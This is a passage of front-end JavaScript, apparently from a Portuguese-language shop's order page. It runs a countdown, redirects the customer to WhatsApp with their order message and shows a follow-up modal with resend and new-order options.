        el('modalSucesso').appendChild(displayContagem);
    }

    // Executa contagem regressiva
    let tempoRestante = 3;
    displayContagem.innerText = tempoRestante;

    const intervalo = setInterval(() => {
        tempoRestante--;
        if (tempoRestante >= 0) {
            displayContagem.innerText = tempoRestante;
        }
        if (tempoRestante <= 0) {
            clearInterval(intervalo);
        }
    }, 1000);

    // Prepara mensagem para WhatsApp
    let mensagem = "";
    try {
        mensagem = montarMensagemWhats();
    } catch (e) {
        mensagem = "Olá, gostaria de fazer um pedido!";
        console.error("Erro ao montar mensagem:", e);
    }

    const telefoneLoja = "5511982391781";
    const urlWhatsApp = `https://api.whatsapp.com/send?phone=${telefoneLoja}&text=${encodeURIComponent(mensagem)}`;

    // Redireciona após 3 segundos
    setTimeout(() => {
        const novaJanela = window.open(urlWhatsApp, '_blank');
        
        // Fallback se popup for bloqueado
        if (!novaJanela || novaJanela.closed || typeof novaJanela.closed == 'undefined') {
            window.location.href = urlWhatsApp;
        }

        // Mostra modal pós-envio
        setTimeout(() => {
            mostrarModalPosEnvio();
        }, 800);
        
    }, 3000);
}

/**
 * Mostra modal pós-envio com opções
 */
function mostrarModalPosEnvio() {
    fecharModais();
    el('modalOverlay').style.display = 'block';
    
    // Cria ou atualiza modal
    let modalPos = el('modalPosEnvio');
    if (!modalPos) {
        modalPos = document.createElement('div');
        modalPos.id = 'modalPosEnvio';
        modalPos.className = 'modal-pedido';
        modalPos.style.display = 'block';
        modalPos.style.textAlign = 'center';
        document.body.appendChild(modalPos);
    }

    modalPos.innerHTML = `
        <h3>Pedido Enviado!</h3>
        <p>O que deseja fazer agora?</p>
        <button class="btn-prosseguir" onclick="reenviarWhats()" style="background:#25d366; margin-bottom:10px;">
            <i class="fab fa-whatsapp"></i> REENVIAR PARA WHATSAPP
        </button>
        <button class="btn-prosseguir" onclick="location.reload()" style="background:var(--a-brown); margin-bottom:10px;">
            FAZER NOVO PEDIDO
        </button>
        <button class="btn-voltar" onclick="fecharModais()">ENCERRAR</button>
    `;
}

/**
 * Reenvia pedido para WhatsApp
 */
function reenviarWhats() {
    const mensagem = montarMensagemWhats();
    const url = `https://wa.me/5511982391781?text=${encodeURIComponent(mensagem)}`;
    window.open(url, '_blank');
}